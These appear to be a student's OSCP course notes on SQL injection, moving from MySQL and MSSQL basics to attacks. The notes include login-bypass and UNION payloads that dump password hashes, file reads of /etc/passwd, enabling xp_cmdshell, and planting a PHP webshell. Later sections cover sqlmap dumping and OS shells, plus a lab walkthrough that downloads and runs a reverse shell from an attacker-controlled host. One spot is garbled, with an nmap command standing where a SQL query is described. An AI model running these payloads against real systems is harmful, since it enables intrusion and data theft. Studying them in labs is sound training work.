ke# Sql theory
SQL syntax, commands and functions vary  based in which database is being used. Popular ones include
- MySQL
- Microsoft SQL Server
- PostgresSQL
- Oracle
Example MySQL query
`SELECT * FROM users WHERE user_name="leon"`
Select statement instructs the database we want to retreive all records from the keyword users
To automate functionality web apps often embed sql queries into the source code

# DB Types and Characteristics
## MySql
First let's explore MySQL
we can connect to remote mysql servers with the following command:
`mysql -u root -p'root' -h 192.168.50.16 -P 3306`
There shouldn't be any spaces between -p'\<password\>'
### Basic Commands
we can run `version()` to get the version of the db
create database: `CREATE DATABASE users;`
verify the user `select system_user()`
We can collect a list of all databases running by using `show databases;`
select database: `USE <database>`
From here we can see tables in a db by running `SHOW TABELS From <database>`
We can use **DESCRIBE** keyword to list the table structure and format. `DESCRIBE <table>` --> use to get column names
Basic **SELECT** commands to access table data:
```sql
SELECT * FROM table_name;
```
```sql
SELECT column1, column2 FROM table_name;
```
Here is an example command to select the password for the user 'offsec'
`SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';`
The [INSERT](https://dev.mysql.com/doc/refman/8.0/en/insert.html) statement is used to add new records to a given table. The statement following the below syntax:
```sql
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
```
We can do things like insert new logins / users into existing tables
**WHERE** can be used to filter results returned by SELECT
```sql
SELECT * FROM table_name WHERE <condition>;
```
common conditions are \<column id\> =,<,> \<value\>
Note: String and date data types should be surrounded by single quote (') or double quotes ("), while numbers can be used directly
**LIKE** clause allows us to select records with matching patterns
```shell-session
SELECT * FROM logins WHERE username LIKE 'admin%'
```
% is wildcard like linux \*
\_ is a wildcard for a single character
```shell-session
SELECT * FROM logins WHERE username like '___';
```

We can use the **ALTER** statement to change the name of any table or any of it's fields (table properties). Has the functions ADD, RENAME COLUMN, MODIFY, DROP

**UPDATE** can be used to update records within a table
```sql
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
```
An example of updating passwords in a log in table
```shell-session
UPDATE logins SET password = 'change_password' WHERE id > 1;
```
We can sort the results of any query using **ORDER BY** and selecting the column to sort by
```shell-session
SELECT * FROM logins ORDER BY password;
```
default is ascending order but we can also sort by descending
```shell-session
SELECT * FROM logins ORDER BY password DESC;
```
It is also possible to sort by multiple columns, to have a secondary sort for duplicate values in one column
```shell-session
SELECT * FROM logins ORDER BY password DESC, id ASC;
```
**LIMIT** can be used to limit the number of results returned
```shell-session
SELECT * FROM logins LIMIT 2;
```
### Logical Operators
The most common logical operators are  AND, OR, and NOT.
**AND** takes in two conditions and returns true or false based on their evaluation. True if and only if both conditions are true
```shell-session
SELECT 1 = 1 AND 'test' = 'test';
```
evaluates to true
```shell-session
SELECT 1 = 1 AND 'test' = 'abc';
```
evaluates to false

**OR** takes in two expressions and returns true when at least one of them is true. Both previous examples would evaluate to true while the following example would be false
```shell-session
SELECT 1 = 2 OR 'test' = 'abc';
```
**NOT** toggles a boolean value i.e. true becomes false and false becomes true
```shell-session
SELECT NOT 1 = 1;
```
This evaluates as false
AND, OR, and NOT can also be represneted as &&, ||, and !
operators can be used in queries
 The following query lists all records where the `username` is NOT `john`:
```shell-session
SELECT * FROM logins WHERE username != 'john';
```
The next query selects users who have their `id` greater than `1` AND `username` NOT equal to `john`:
```shell-session
SELECT * FROM logins WHERE username != 'john' AND id > 1;
```
SQL supports various other operations such as addition, division as well as bitwise operations. Thus, a query could have multiple expressions with multiple operations at once. The order of these operations is decided through operator precedence.

Here is a list of common operations and their precedence, as seen in the [MariaDB Documentation](https://mariadb.com/kb/en/operator-precedence/):

- Division (`/`), Multiplication (`*`), and Modulus (`%`)
- Addition (`+`) and subtraction (`-`)
- Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
- NOT (`!`)
- AND (`&&`)
- OR (`||`)

For example 
```sql
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
```
The query has four operations: `!=`, `AND`, `>`, and `-`. From the operator precedence, we know that subtraction comes first, so it will first evaluate `3 - 2` to `1`:
```sql
SELECT * FROM logins WHERE username != 'tom' AND id > 1;
```
Next, we have two comparison operations, `>` and `!=`. Both of these are of the same precedence and will be evaluated together. So, it will return all records where username is not `tom`, and all records where the `id` is greater than 1, and then apply `AND` to return all records with both of these conditions:

## Basic Payloads
| Payload            | When to Use                      | Expected Output                                     | Wrong Output                                              |
| ------------------ | -------------------------------- | --------------------------------------------------- | --------------------------------------------------------- |
| `SELECT @@version` | When we have full query output   | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'     | In MSSQL it returns MSSQL version. Error with other DBMS. |
| `SELECT POW(1,1)`  | When we only have numeric output | `1`                                                 | Error with other DBMS                                     |
| `SELECT SLEEP(5)`  | Blind/No Output                  | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS                   |


## MSSQL
Built in cmd line tool SQLCMD allows SQL queries to be run through command prompt or remotely
kali includes impacket; a python framework that enables network protocol interactions. --> we can use the *impacket-mssqlclient* tool
exmaple
`impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`
In this example -windows-auth forces NTLM
to see the version we run `SELECT @@version;`
To list all the available databseas, we can select all names from the system catalog
`SELECT name FROM sys.databases`
When using a SQL Server command line tool like sqlcmd, we must submit our SQL statement ending with a semicolon followed by _GO_ on a separate line. However, when running the command remotely, we can omit the GO statement since it's not part of the MSSQL TDS protocol.
Default Databases
- master
- tempdb
- model
- msdb
We want to explore the custom ones
we can query the offsec table by selecting tables in the coresponding information schema
`SELECT * FROM offsec.information_schema.tables;`
we see the follwoing output:
```mssql
TABLE_CATALOG                                                                                                                      TABLE_SCHEMA                                                                                                                       TABLE_NAME                                                                                                                         TABLE_TYPE

--------------------------------------------------------------------------------------------------------------------------------   --------------------------------------------------------------------------------------------------------------------------------   --------------------------------------------------------------------------------------------------------------------------------   ----------

offsec                                                                                                                             dbo                                                                                                                                users                                                                                                                              b'BASE TABLE'
```
the only table available is users --> dbo is the schema
to access users we run
`select * from offsec.dbo.users;`
# Identifying SQLi payloads
The goal is for the attacker to inject code outside of the expected user input limits. **Usually done by supplying " or ' to escape query** 

We can start by inspecting the code for logins --> we may be able to see if the application is sanitizing the input or not
we can try to login using using SQLi via the following code:
`offec' OR 1=1 --//`
the single quote will close off the username field and inject the statement OR 1=1 which will always be true
the '--' ends the sql statement so there is no password comparison and the  // makes sure nothing is truncated
If this vulnerability is present we may also be able to query the database directly with the command:
```sql
' OR 1=1 in (SELECT * FROM users) -- //
```

## Basic Payloads
We can use basic payloads to see if applications throw errors for malformed queries

| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |
# UNION-based Payloads
If we are dealing with SQLI and the result of the query is dispayed along with the application returned value, we should also check for UNION-based SQL injections
the UNION keyword aids exploitation because because it enables the execution of an extra SELECT statement and provides results in the same query
For these attacks to work there are two conditions we need to satisfy
- the injected UNION query has to include the same number of columns as the original query
- The data types need to be compatible between each column
Example
	To demonstrate this concept, let's test a web application with the following preconfigured SQL query:
	```
	$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
	```
	The query fetches all the records from the _customers_ table. It also includes the **LIKE**[2](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/sql-injection-attacks/manual-sql-exploitation/union-based-payloads#fn2) keyword to search any _name_ values containing our input that are followed by zero or any number of characters, as specified by the percentage (_%_) operator.
	Before crafting any attack we need to know the number of columns --> ==we can find this out by submitting injecting the query== `'ORDER BY 1 -- //`
	the above statement will fail whenever the selected column doesn't exist --> increase value until an error is returned
	in our example we get an error when the value is 6, so we know there are 5 columns
	with this in mind we can attempt our first attack by enumerating the current database for name, user, and version
	```
	nmap -p- -O -A -o nmap_112_all -Pn 192.168.90.112
	```
	The last two columns are left null to make sure we match the original table
	We will see the return value of the injected code at the bottom of the table except we are missing the first column we requested.
	Most web apps have an "id" value in the first column that isn't displayed. --> we should lead with the "nulls"
	Additioanlly, some web apps might only be configured to display a certain data type. Try to match integers with integers, strings with strings if possible
	```
	' UNION SELECT null, null, database(), user(), @@version  -- //
	```
	Now let's try to enumerate the information schema to get more info on the table
	```
	' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
	```
	from the output we get two tables, customers and users, and we see that the user table has a column called passwords
	Let's dump the users table
	```
	' UNION SELECT null, username, password, description, null FROM users -- //
	```
	We get the hashes

Check user privileges in mySQL
	`' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -`
	If we have the file prvilege we can use the LOAD_FILE() command to read files on the OS
	`cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`
# Blind Sql injection
Previously sql queires we saw were in-band, because we were able to see the output
Blind sql injections describe scenarios where responses are never returned
time based blind SQLi infer query results by instructing the database to wait a specific amount of time. Based on response time we can determine if something is TRUE or FALSE
For Example if we see the url of a website includes a value from a table like username we can add logic to query the table and see if other names are valid
```sql
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```
Since 1=1 will always be true the app will return values only if the user name is present
We an also put in a sleep statement to execute if the AND evaluates to false
```sql
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```
# Manual Code Execution
Depending on the underlying system we need to adapt our strategy to get code execution
In MS SQL the **xp_cmdshell** function takes a string and passes it to  command shell. The function returns any output as rows of text. This function is disabled by default and if enabled it must be called with the EXECUTE Keyword --> ==We can check user permission to see if we can reconfigure the server to enable this option==
To check permissions on MS SQL run `fn_my_permissions ( securable , 'securable_class' )` where securable can be a server or database name
Example of enabling xp_cmdshell:
```sql
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
```
Once xp_cmdshell is enabled we can execute commands on the system:
```sql
EXECUTE xp_cmdshell 'whoami'
```
To gain a reverse shell we can write a simple php webshell to a file and then navigate to it via browser
- For this attack to work the file location must be writable to the OS user running the database software
- Not explicitly said, but I would think the file has to be reachable by the browser. The following example uses /tmp, but consider writing it under the web root somewhere so we know we have access
In this example we assume the vulnerability is a UNION-based attack:
```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
The php system function will parse any statement included in the cmd parameter coming form the client
Note: we may receive an error about return types being incompatible. This does not impact writing the webshell to a file.
We can now navigate to the webshell and execute commands via the cmd parameter
# Automating the Attack
The SQLi process can be automated using several pre installed tools on Kali
==**NOTE AUTOMATED SQL INJECTION TOOLS ARE PROHIBITED ON THE OSCP EXAM**==
Let's run sqlmap on the vulnerable web app
```
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
```
-u specifies the url
-p specifies the parameter to test
SQL map will return information about attacks. In this case it shows we are dealing with a time based blind SQLi
We can use SQLmap to dump the database:
```bash
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
```
sqlmap outputs info as it goes and we can see we are getting data from the tables
Since this is a time based sqli it is a little slow but eventually we dump the tables
sqlmap also has a core feature to provide a full interactive shell --os-shell
Note since time based attacks involve a lot of latency a shell is not good for those. In this example we switch to a union based attack
- First we need to intercept a post request going to the web app with burpsuite
- Save the POST request as a text file in Kali
- Invoke sqlmap witht the -r parameter using the post file as an arguement. We also need to indicate item is the vulnerable field
- include --os-shell paramter
- include web root we found earlier
- `sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"`
# Capstone Notes
Make sure we are adding host names into /etc/hosts if the site has a redirect. **This includes links from the intial site**. If we end up at a weird website try adding address to etc hosts and see if site changes
==You may not need to manually interact with a SQLi vulneraility. It may not be present on a page reachable by the user== --> if no SQLi vulns are found we can use tools like wpscan to further enumerate the website --> ==**LOOK at PoC for any vulnerabilties found by scanner**==
Don't Forget about blind SQLi. Things like subscribing to a newsletter where a POST command is used may be sending to a sql database
==we can use repeater against any potential fields to try multiple sql injection attacks==
Don't forget to try union attacks
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection --> Good resource for syntax
Question 10.3.2.7 I identified the vulnerable field ||username via time based SQLi and injected commands to enable xp_cmdshell:
';EXEC sp_configure 'show advanced options', 1;--
';RECONFIGURE;--
';EXEC sp_configure 'xp_cmdshell', 1;--
';RECONFIGURE;--
and then I host my reverse shell script on an http server, port 8000, via python -m http.server
Finally, I run ';EXEC xp_cmdshell 'certutil.exe -f -URLcache http://192.168.45.183:8000/ps_rev.ps1 C:\Users\Public\ps_rev.ps1';--
';EXEC xp_cmdshell 'C:\Users\Public\reverse.exe';--